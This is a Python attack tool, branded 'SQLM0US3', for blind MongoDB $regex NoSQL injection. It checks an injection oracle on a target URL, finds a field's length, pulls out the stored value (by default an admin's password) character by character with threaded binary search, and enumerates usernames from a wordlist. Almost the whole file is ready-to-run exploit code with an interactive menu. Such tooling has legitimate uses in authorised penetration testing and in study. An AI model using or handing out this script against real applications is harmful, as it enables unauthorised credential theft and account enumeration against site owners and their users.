#!/usr/bin/python3
import sys
import requests
import argparse
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET_URL  = "http://TARGET/"   # <- change
TRUE_MARKER = "Success"          # <- keyword that indicates TRUE response

session = requests.Session()
# session.proxies = {"http": "http://127.0.0.1:8080"}  # uncomment for Burp

def oracle(regex: str) -> bool:
    """
    Returns True if `regex` matches the target field.
    Edit this function to match your injection point.

    Common injection styles:
      GET param:  ?user=admin&pass[$regex]=REGEX
      POST JSON:  {"user": "admin", "pass": {"$regex": "REGEX"}}
      POST form:  pass[$regex]=REGEX
    """
    encoded = urllib.parse.quote(regex)
    r = session.get(f"{TARGET_URL}?user=admin&pass[$regex]={encoded}", timeout=15)
    return TRUE_MARKER in r.text


def _hex4(n: int) -> str:
    """Format integer as 4-digit hex for regex unicode escape."""
    return f"{n:04x}"


def dump_length(field_prefix: str = "", max_len: int = 100) -> int:
    """
    Find string length using regex anchor: ^PREFIX.{N,}$
    Binary search then exact match.
    """
    lo, hi = 0, max_len
    while hi - lo > 3:
        mid = (lo + hi) // 2
        if oracle(f"^{field_prefix}.{{{mid},}}$"):
            lo = mid
        else:
            hi = mid
    for i in range(lo, hi + 1):
        if oracle(f"^{field_prefix}.{{{i}}}$"):
            return i
    return lo


def _extract_char(index: int, length: int, field_prefix: str,
                  lo: int = 0x20, hi: int = 0x7e) -> tuple[int, int]:
    """
    Binary search one character at position `index` using hex range regex.
    Returns (index, char_code).

    Pattern: ^PREFIX.{index}[\xLO-\xHI].{tail}$
    where tail = length - index - 1
    """
    tail = length - index - 1

    left, right = lo, hi
    while right - left > 3:
        mid = (left + right) // 2
        pattern = (
            f"^{field_prefix}"
            f".{{{index}}}"
            f"[\\x{{{_hex4(left)}}}-\\x{{{_hex4(mid)}}}]"
            f".{{{tail}}}$"
        )
        if oracle(pattern):
            right = mid
        else:
            left = mid + 1

    for c in range(left, right + 1):
        pattern = (
            f"^{field_prefix}"
            f".{{{index}}}"
            f"[\\x{{{_hex4(c)}}}]"
            f".{{{tail}}}$"
        )
        if oracle(pattern):
            return (index, c)

    return (index, 0x3f)   # fallback: '?'


def dump_string(length: int, field_prefix: str = "", workers: int = 20) -> str:
    """
    Extract all characters in parallel.
    Each position is independent — safe to parallelize unlike time-based.
    """
    chars: dict[int, int] = {}

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {
            ex.submit(_extract_char, i, length, field_prefix): i
            for i in range(length)
        }
        done = 0
        for fut in as_completed(futures):
            idx, code = fut.result()
            chars[idx] = code
            done += 1
            partial = "".join(
                chr(chars[j]) if j in chars and 32 <= chars[j] <= 126 else "?"
                for j in range(length)
            )
            print(f"  [*] [{done}/{length}] -> {partial}", end="\r")

    print()
    return "".join(
        chr(chars[i]) if 32 <= chars[i] <= 126 else f"\\x{chars[i]:02x}"
        for i in range(length)
    )


# ══════════════════════════════════════════════════════════════════
# ░░  FIELD ENUMERATION  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ══════════════════════════════════════════════════════════════════
#
# MongoDB $regex injection leaks ONE field at a time — the field
# the injection lands in. To read other fields you need a different
# approach per situation:
#
#   (A) If the app reflects multiple fields (e.g. username + password
#       in the same query), inject the known field, read the unknown.
#
#   (B) If only one field is injectable, use a known prefix to anchor
#       the match and iterate through possible values.
#
#   (C) For multi-document enumeration, combine with $gt / $lt or
#       use $where (if enabled) for cross-field conditions.
#
# The functions below cover the most common case: reading the value
# of the injected field for a specific known user.
# ══════════════════════════════════════════════════════════════════

def action_test():
    print("\n[*] Oracle self-test")
    t = oracle(".*")        # matches anything -> should be TRUE
    f = oracle("^XYZXYZ$")  # matches nothing  -> should be FALSE
    print(f"  .*     -> {t}")
    print(f"  XYZXYZ -> {f}")
    if t and not f:
        print("  [+] Oracle is working correctly\n")
    else:
        print("  [-] Oracle misconfigured — check TRUE_MARKER or injection point\n")
        sys.exit(1)


def action_dump_field(workers: int):
    prefix = input("  Known prefix (leave blank if none) : ").strip()
    print("\n[*] Measuring length...")
    length = dump_length(field_prefix=prefix)
    # subtract prefix from reported length
    actual = length - len(prefix)
    print(f"  [*] Field length: {actual} (total anchored: {length})")
    if actual <= 0:
        print("  [-] Length = 0 or prefix longer than value\n")
        return
    print("[*] Extracting characters...")
    result = dump_string(actual, field_prefix=prefix, workers=workers)
    print(f"  [+] Value -> {prefix}{result}\n")
    return result


def action_brute_users(workers: int):
    """
    Enumerate documents by probing common username patterns.
    Useful when you can vary the 'user' parameter.
    """
    print("\n[*] Username enumeration")
    print("  [i] Edit oracle() to inject the user field instead of pass.")
    wordlist = input("  Wordlist path (one username per line) : ").strip()
    try:
        with open(wordlist) as f:
            names = [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        print(f"  [-] File not found: {wordlist}")
        return

    found = []
    def check(name):
        return name if oracle(f"^{re.escape(name)}$") else None

    import re
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(check, n): n for n in names}
        for fut in as_completed(futures):
            result = fut.result()
            if result:
                print(f"  [+] Found user: {result}")
                found.append(result)

    print(f"\n  [+] Users found: {found}\n")
    return found


BANNER = r"""
███████╗ ██████╗ ██╗     ███╗   ███╗ ██████╗ ██╗   ██╗███████╗██████╗ 
██╔════╝██╔═══██╗██║     ████╗ ████║██╔═══██╗██║   ██║██╔════╝╚════██╗
███████╗██║   ██║██║     ██╔████╔██║██║   ██║██║   ██║███████╗ █████╔╝
╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██║   ██║██║   ██║╚════██║ ╚═══██╗
███████║╚██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║██████╔╝
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═════╝
          NoSQL Blind Injection
"""

MENU = """
    (0) Oracle test
    (1) Dump field value
    (2) Username enumeration (wordlist)

  Your choice : """


def main():
    parser = argparse.ArgumentParser(description="SQLM0US3 — NoSQL Blind Injection")
    parser.add_argument("--workers", type=int, default=20,
                        help="Parallel thread count (default: 20)")
    args = parser.parse_args()

    print(BANNER)
    print(f"  Mode : MongoDB $regex   Workers : {args.workers}\n")

    choice = int(input(MENU))

    actions = {
        0: action_test,
        1: lambda: action_dump_field(args.workers),
        2: lambda: action_brute_users(args.workers),
    }

    if choice in actions:
        actions[choice]()
    else:
        print("  [-] Invalid option")


if __name__ == "__main__":
    main()
